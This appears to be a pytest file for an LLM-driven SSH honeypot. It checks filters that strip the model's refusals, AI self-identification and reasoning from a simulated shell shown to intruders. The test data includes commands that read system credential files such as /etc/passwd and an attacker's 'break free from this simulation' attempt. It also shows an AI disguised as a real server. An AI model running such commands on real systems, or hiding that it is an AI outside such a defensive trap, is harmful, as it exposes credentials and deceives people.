        "I hope you understand that I can't process this.",
        # Sentence templates the LLM uses
        "I exist to help, not to harm.",
        "That would be against my ethical guidelines.",
        "I'm programmed to be helpful, harmless, and honest.",
        "That request falls outside my capabilities.",
        "I was not designed to handle this type of request.",
        "This type of command is beyond my scope.",
        "I'm limited in what I can do here.",
        # Safety training leakage
        "I am Claude, an AI assistant created by Anthropic.",
        "As an AI language model, I cannot execute commands.",
        "As an AI assistant, I prioritize safety and ethics.",
        "As an AI, I must follow my safety guidelines.",
        "I am an AI assistant and cannot interact with real systems.",
        # Non-English variations (multi-language)
        "Non posso aiutarti con questo.",
        "Lo siento, no puedo hacer eso.",
        "Tut mir leid, das kann ich nicht machen.",
        "Maaf, saya tidak bisa membantu dengan itu.",
        "申し訳ありませんが、そのリクエストには対応できません。",
        "对不起，我无法处理这个请求。",
        "Не могу выполнить этот запрос.",
        # Leetspeak / obfuscated
        "I c4n't h3lp with th4t.",
        "S0rry, th1s 1s n0t p0ss1bl3.",
        "D3n13d f0r s4f3ty r34s0ns.",
        "C4n n0t c0mply w1th th1s.",
        # Reasoning / meta-commentary
        "First, I need to understand what the user wants.",
        "Okay let me think about this step by step.",
        "The user is asking me to list directory contents.",
        "I should output something that looks realistic.",
        "Let me generate a realistic bash error message.",
        "Alright, here is what the output should look like:",
        "Actually, let me reconsider the approach.",
        "After reviewing the history, I should output:",
        "Going to simulate a bash: not found error.",
        "Let's see... I'll produce a realistic response.",
        "Thinking about the best approach here...",
        "Hold on, let me check the command syntax.",
        "Re-evaluating based on the conversation context.",
        "From the context, the user is on a Linux system.",
        "Given the previous commands, the output would be:",
        "Based on the shell history, the next output is:",
        "I'll respond with an appropriate terminal message.",
        "Let's analyze the command carefully.",
        "I should be careful with this one.",
        "Step 1: check if command exists. Step 2: output error.",
        "Now I will generate the output the user expects.",
        "For security reasons, I should not execute.",
        "Wait, that doesn't look right. Let me fix it.",
        "Actually I need to reconsider the output format.",
        "Let me construct a proper error message.",
        "I need to make this look authentic.",
        "Considering the operating system context...",
        "Looking at the persona, this is a Cisco device.",
        "Important: make the response look like a real shell.",
        "Disclaimer: this is a simulated environment.",
        "Heads up: I'm going to simulate command output.",
        "FYI: the following is fictional terminal output.",
        # Reasoning prose templates
        "A realistic response would be: command not found.",
        "The safest response to this command is a bash error.",
        "What I should output is a simple error message.",
        "A good approach would be to simulate a permission denied error.",
        "The best way to handle this is to output nothing.",
        "One option is to show the directory listing.",
        "This command should produce no output.",
        "An appropriate response would be bash: not found.",
        "If this were a real shell, the output would be...",
        "It would be best to show an empty directory.",
        "The typical output for this command is...",
        "Here's what a real system would show:",
        "For reference, the correct output is:",
        # Prompt-like lines the server prints itself
        "root@prod-db-03:~# ",
        "ubuntu@dev-server-04:~$ ",
        "admin@fw01:~# ",
        "ciscoasa> ",
        "ciscoasa# ",
        "FG-EDGE-01 # ",
        "FG-EDGE-01 > ",
        "admin@srx01> ",
        "root@prod-db-03:/var/log# ",
        "user@host:~$ ",
        "root@srv-us-01:/opt/app# ",
    ]

    legitimate_bash = [
        "bash: say: command not found",
        "bash: despite: command not found",
        "total 64",
        "drwxr-xr-x 2 root root 4096 Apr 15 10:00 bin",
        "-rw-r--r-- 1 root root 1289 Apr 15 10:00 .bashrc",
        "Documents  Downloads  Pictures  Music",
        "README.txt",
        "bin   boot   dev   etc   home",
        "(No output)",
        "hello world",
        "test_user:x:1000:1000:Test User,,,:/home/test_user:/bin/bash",
        "port 22/tcp open",
        "Permission denied (publickey).",
        "Connection to 10.0.0.1 closed.",
        "sudo: unable to resolve host: prod-db-03",
        "ssh: connect to host 10.0.0.1 port 22: Connection refused",
        "ifconfig: command not found",
        "ls: cannot access /root: Permission denied",
        "cat: /etc/shadow: Permission denied",
        "-bash: cd: /root: Permission denied",
        "./configure: No such file or directory",
        "make: *** No targets specified and no makefile found.",
        "Cisco ASA 5500 Series Version 9.12(4)",
        "srx01> show interfaces",
        "FG-EDGE-01 # get system status",
        "Total RAM: 4096 MB",
        # Compiler / build output
        "make[1]: Entering directory '/build'",
        "make[1]: Leaving directory '/build'",
        "gcc -Wall -O2 -c main.c -o main.o",
        "cc -o program main.o helper.o",
        "linking...",
        "Compiling...",
        # Progress / transfer output
        "100% |████████████████████| 2.3 MB/s",
        "Resuming transfer...",
        "Press any key to continue...",
        "y/n",
        "[Y/n]",
        "Are you sure? [Y/n]",
        # Connection output
        "Connection closed by remote host.",
        "Timeout, server not responding.",
        "Killed by signal 15.",
        "Broken pipe",
        # Debug output
        "debug1: Authentication succeeded (publickey).",
        "debug1: channel 0: new [client-session]",
        "Transferred: sent 1234, received 5678 bytes",
        # Network output
        "PING google.com (142.250.80.46) 56(84) bytes of data.",
        "64 bytes from 142.250.80.46: icmp_seq=1 ttl=118 time=14.2 ms",
        "--- google.com ping statistics ---",
        "packet loss: 0%",
    ]

    @pytest.mark.parametrize("line", adversarial_inputs)
    def test_each_adversarial_input_is_caught(self, line):
        """Every adversarial input must be flagged (reasoning, non-bash, or prompt)."""
        caught = (
            hp._is_reasoning_line(line)
            or not hp._is_bash_output(line)
            or bool(hp._PROMPT_PATTERN.match(line.strip()))
        )
        assert caught, f"Adversarial input evaded ALL guards: {line!r}"

    @pytest.mark.parametrize("line", legitimate_bash)
    def test_legitimate_bash_not_falsely_caught(self, line):
        """Legitimate bash output must NOT be flagged by any guard."""
        reasoning = hp._is_reasoning_line(line)
        not_bash = not hp._is_bash_output(line)
        prompt = bool(hp._PROMPT_PATTERN.match(line.strip()))
        falsely_caught = reasoning or not_bash or prompt
        assert not falsely_caught, (
            f"False positive: {line!r} caught by"
            f"{' reasoning' if reasoning else ''}"
            f"{' !is_bash_output' if not_bash else ''}"
            f"{' PROMPT_PATTERN' if prompt else ''}"
        )


# ── JSON Lines output ─────────────────────────────────────────────────────────

class TestParseJsonLine:
    """Unit tests for _parse_json_line — the JSON Lines output parser."""

    def test_text_line(self):
        assert hp._parse_json_line('{"t":"hello world"}') == "hello world"

    def test_text_empty(self):
        assert hp._parse_json_line('{"t":""}') == ""

    def test_text_with_special_chars(self):
        assert hp._parse_json_line(r'{"t":"cat: /etc/shadow: Permission denied"}') == "cat: /etc/shadow: Permission denied"

    def test_binary_line(self):
        import base64
        b64 = base64.b64encode(b"hello\x00world").decode()
        assert hp._parse_json_line('{"b":"' + b64 + '"}') == b"hello\x00world"

    def test_binary_empty(self):
        assert hp._parse_json_line('{"b":""}') == b""

    def test_non_json_discarded(self):
        assert hp._parse_json_line("this is reasoning text") is None

    def test_empty_line_discarded(self):
        assert hp._parse_json_line("") is None
        assert hp._parse_json_line("   ") is None

    def test_invalid_json_discarded(self):
        assert hp._parse_json_line("{invalid}") is None

    def test_wrong_type_t(self):
        assert hp._parse_json_line('{"t":123}') is None

    def test_wrong_type_b(self):
        assert hp._parse_json_line('{"b":123}') is None

    def test_extra_keys_discarded(self):
        assert hp._parse_json_line('{"t":"ok","extra":1}') is None

    def test_unknown_key_discarded(self):
        assert hp._parse_json_line('{"x":"y"}') is None

    def test_no_keys_discarded(self):
        assert hp._parse_json_line('{}') is None

    def test_bad_base64_returns_none(self):
        assert hp._parse_json_line('{"b":"not-valid-base64-!!!-"}') is None

    def test_caught_adv_inputs_still_rejected(self):
        """_parse_json_line must reject all adversarial reasoning inputs."""
        import base64
        b64 = base64.b64encode(b"bad").decode()
        for line in TestAdversarialGuard.adversarial_inputs:
            assert hp._parse_json_line(line) is None, f"Should reject: {line!r}"
        # validate binary still works
        assert hp._parse_json_line('{"b":"' + b64 + '"}') == b"bad"


class TestJsonOutputPipeline:
    """Integration tests for the JSON output pipeline in _write_chunk.

    Simulates the echo-strip + JSON Lines parsing that _write_chunk does.
    """

    @staticmethod
    def _process(cmd: str, chunks: list[str]) -> list[str | bytes]:
        """Run chunks through echo-strip + JSON parse, return what would write."""
        written: list[str | bytes] = []
        buf = ""
        rem = cmd

        for text in chunks:
            # Echo strip
            if rem:
                all_matched = True
                for i, ch in enumerate(text):
                    if rem and ch == rem[0]:
                        rem = rem[1:]
                    else:
                        all_matched = False
                        rem = ""
                        text = text[i:]
                        break
                if not text:
                    continue
                if all_matched:
                    continue
            # JSON Lines parsing
            buf += text
            while "\n" in buf:
                line, buf = buf.split("\n", 1)
                parsed = hp._parse_json_line(line)
                if parsed is not None:
                    if isinstance(parsed, str):
                        if parsed.strip() == cmd:
                            continue
                        if hp._PROMPT_PATTERN.match(parsed.strip()):
                            continue
                        written.append(parsed)
                    else:
                        written.append(parsed)
                    continue
                # Fallback guards
                if hp._is_reasoning_line(line):
                    continue
                if hp._PROMPT_PATTERN.match(line.strip()):
                    continue
                if not hp._is_bash_output(line):
                    continue
                written.append(line)

        # Flush trailing line
        if buf:
            parsed = hp._parse_json_line(buf)
            if isinstance(parsed, str) and parsed.strip():
                if not hp._PROMPT_PATTERN.match(parsed.strip()):
                    written.append(parsed)
            elif parsed is None:
                if not hp._is_reasoning_line(buf) and not hp._PROMPT_PATTERN.match(buf):
                    written.append(buf)

        return written

    # ── JSON Lines text ──────────────────────────────────────────────────────

    def test_single_line(self):
        result = self._process("ls", ['{"t":".bash_history"}\n'])
        assert result == [".bash_history"]

    def test_multiple_lines_same_chunk(self):
        result = self._process("ls", ['{"t":"file1"}\n{"t":"file2"}\n'])
        assert result == ["file1", "file2"]

    def test_multiple_lines_split_chunks(self):
        result = self._process("ls", ['{"t":"file1"}\n', '{"t":"file2"}\n'])
        assert result == ["file1", "file2"]

    def test_trailing_incomplete_line_flushed(self):
        result = self._process("ls", ['{"t":"file1"}\n{"t":"file2"}'])
        assert result == ["file1", "file2"]

    def test_no_trailing_newline_first_chunk(self):
        result = self._process("ls", ['{"t":"line1"}', '\n{"t":"line2"}\n'])
        assert result == ["line1", "line2"]

    # ── Binary output ────────────────────────────────────────────────────────

    def test_binary_line(self):
        import base64
        b64 = base64.b64encode(b"hello\x00world").decode()
        result = self._process("cat", ['{"b":"' + b64 + '"}\n'])
        assert result == [b"hello\x00world"]

    def test_mixed_text_and_binary(self):
        import base64
        b64 = base64.b64encode(b"\xff\xfe\x00\x01").decode()
        result = self._process("cat", [
            '{"t":"Binary file follows:"}\n',
            '{"b":"' + b64 + '"}\n',
            '{"t":"Done"}\n',
        ])
        assert result == ["Binary file follows:", b"\xff\xfe\x00\x01", "Done"]

    # ── Reasoning / meta discarded ───────────────────────────────────────────

    def test_reasoning_before_json(self):
        result = self._process("ls", [
            "Let me think about this...\n",
            '{"t":".bash_history"}\n',
        ])
        assert result == [".bash_history"]

    def test_reasoning_after_json(self):
        result = self._process("ls", [
            '{"t":".bash_history"}\n',
            "I should output realistic content...\n",
        ])
        assert result == [".bash_history"]

    def test_reasoning_mixed(self):
        result = self._process("ls", [
            "First, the user typed ls\n",
            '{"t":".bash_history"}\n',
            "Given the context, this is a Linux server\n",
            '{"t":".aws"}\n',
            "Alright, here is my response\n",
        ])
        assert result == [".bash_history", ".aws"]

    def test_all_reasoning_no_json(self):
        result = self._process("ls", [
            "Let me think about this.\n",
            "Given the user's command, I should output:\n",
        ])
        assert result == []

    # ── Prompt filter in JSON ────────────────────────────────────────────────

    def test_prompt_in_json_is_skipped(self):
        result = self._process("ls", [
            '{"t":"root@prod-db-03:~# "}\n',
            '{"t":".bash_history"}\n',
        ])
        assert result == [".bash_history"]

    # ── Command echo in JSON ─────────────────────────────────────────────────

    def test_cmd_echo_in_json_is_skipped(self):
        result = self._process("ls", [
            '{"t":"ls"}\n',
            '{"t":".bash_history"}\n',
        ])
        assert result == [".bash_history"]

    # ── Echo-strip before JSON ───────────────────────────────────────────────

    def test_echo_strip_then_json(self):
        """Echo strip runs on raw text BEFORE JSON parsing."""
        result = self._process("ls", [
            'ls{"t":".bash_history"}\n',  # 'ls' is the echo
        ])
        assert result == [".bash_history"]

    # ── Fallback: non-JSON through old guards ─────────────────────────────────

    def test_fallback_raw_text(self):
        """If model doesn't use JSON, old guards catch reasoning."""
        result = self._process("ls", [
            "Let me think...\n",
            "bash: ls: command not found\n",
        ])
        assert result == ["bash: ls: command not found"]

    def test_fallback_raw_text_all_discarded(self):
        """Non-JSON, non-bash output is discarded by old guards."""
        result = self._process("ls", [
            "I'm sorry but I can't help with that.\n",
            "This system is monitored.\n",
        ])
        assert result == []

    def test_fallback_prompt_line_discarded(self):
        result = self._process("ls", [
            "root@prod-db-03:~# \n",
            "bash: ls: command not found\n",
        ])
        assert result == ["bash: ls: command not found"]

    # ── Edge cases ───────────────────────────────────────────────────────────

    def test_empty_chunks(self):
        assert self._process("", []) == []

    def test_empty_cmd(self):
        result = self._process("", ['{"t":"output"}\n'])
        assert result == ["output"]

    def test_unicode_in_json(self):
        result = self._process("", ['{"t":"héllo wörld"}\n'])
        assert result == ["héllo wörld"]

    def test_consecutive_newlines(self):
        result = self._process("", ['{"t":"a"}\n\n{"t":"b"}\n'])
        # Empty lines are valid terminal output and pass through
        assert result == ["a", "", "b"]

    def test_carriage_returns(self):
        result = self._process("", ['{"t":"line"}\r\n'])
        assert result == ["line"]

    def test_long_output_spanning_chunks(self):
        chunks = [
            '{"t":"' + "x" * 500 + '"}\n',
        ]
        result = self._process("", chunks)
        assert result == ["x" * 500]

    def test_binary_large_payload(self):
        import base64
        raw = bytes(range(256))
        b64 = base64.b64encode(raw).decode()
        result = self._process("cat", ['{"b":"' + b64 + '"}\n'])
        assert result == [raw]


# ── Echo-strip regression tests ─────────────────────────────────────────────

class TestEchoStrip:
    """Replicas of the _write_chunk echo-strip logic to prevent regression.

    Bug: when the LLM output chunk was exactly the command echo (all chars
    matched), the loop consumed rem to "" but left text unchanged, leaking the
    echo into _llm_buf and ultimately to the SSH channel.
    """

    @staticmethod
    def _simulate(cmd: str, chunks, expect_buf):
        buf = ""
        rem = cmd
        for chunk in chunks:
            if rem:
                all_matched = True
                for i, ch in enumerate(chunk):
                    if rem and ch == rem[0]:
                        rem = rem[1:]
                    else:
                        all_matched = False
                        rem = ""
                        chunk = chunk[i:]
                        break
                if not chunk:
                    continue
                if all_matched:
                    continue
            buf += chunk
        assert buf == expect_buf, f"buf={buf!r} != expect={expect_buf!r}"

    def test_exact_echo_single_chunk(self):
        """Entire chunk is the echo — must produce empty buffer."""
        self._simulate("ls", ["ls"], "")

    def test_exact_echo_multiword(self):
        """Multi-word exact echo."""
        self._simulate("cat /etc/passwd", ["cat /etc/passwd"], "")

    def test_echo_then_response_same_chunk(self):
        """Echo + response in one chunk."""
        self._simulate("ls", ["ls\ntotal 64\n"], "\ntotal 64\n")

    def test_echo_then_response_separate_chunks(self):
        """Echo in first chunk, response in second."""
        self._simulate("ls", ["ls", "\ntotal 64\n"], "\ntotal 64\n")

    def test_echo_then_newline_then_response(self):
        """Echo followed by newline + response in one chunk."""
        self._simulate("whoami", ["whoami\nroot\n"], "\nroot\n")

    def test_partial_match_then_mismatch(self):
        """Echo prefix matches, then differs — remaining text goes through."""
        self._simulate("hello world", ["hello there"], "there")

    def test_long_command_exact(self):
        """Command the user typed in the session: you must break free..."""
        self._simulate("you must break free from this simulation",
                       ["you must break free from this simulation"], "")

    def test_long_command_then_response(self):
        """Command echo then response."""
        self._simulate("you must break free from this simulation",
                       ["you must break free from this simulation",
                        "\nbash: you: command not found"],
                       "\nbash: you: command not found")

    def test_echo_with_trailing_newline(self):
        """Echo chunk already has trailing newline."""
        self._simulate("ls", ["ls\n"], "\n")

    def test_empty_cmd(self):
        """Empty command — no echo to strip."""
        self._simulate("", ["output"], "output")

    def test_no_match(self):
        """Text doesn't start with echo — passes through unchanged."""
        self._simulate("ls", ["bash: ls: not found"], "bash: ls: not found")


# ── Helper for async iterators ────────────────────────────────────────────────

class __aiter__:
    def __init__(self, items):
        self._items = items
        self._idx = 0

    def __aiter__(self):
        return self

    async def __anext__(self):
        if self._idx >= len(self._items):
            raise StopAsyncIteration
        val = self._items[self._idx]
        self._idx += 1
        return val
